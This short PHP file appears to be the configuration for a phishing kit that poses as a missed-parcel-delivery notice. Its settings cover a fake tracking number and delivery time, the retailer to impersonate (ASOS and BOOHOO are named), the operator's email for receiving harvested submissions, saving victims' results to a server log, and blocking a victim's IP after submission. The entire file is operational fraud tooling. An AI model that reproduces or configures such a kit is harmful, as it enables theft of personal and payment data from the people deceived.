<?php

$Your_Email = " "; //////// YOUR EMAIL GOES HERE

$trackingID = "7867764127"; // Set a custom ID for yourself

$deliveryTIME = "10:05am"; // You can change the time of missed delivery here.

$packageFROM = "ABCD"; //Set the company you want here, entirely up to you, ASOS, BOOHOO, Any!

$Send_Log=1;  // Sends results to above email

$Save_Log=1;  // Saves results to server within a txt file

$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending fake forms

//If you would like to change the image, get your new image and change the name of the current "next-day.png" to "old.png", and rename your new image to "next-day.png".

// YOU CAN CHECK BACKUP OF ALL YOUR LOGS IN "USERLOG" FOLDER.
?>
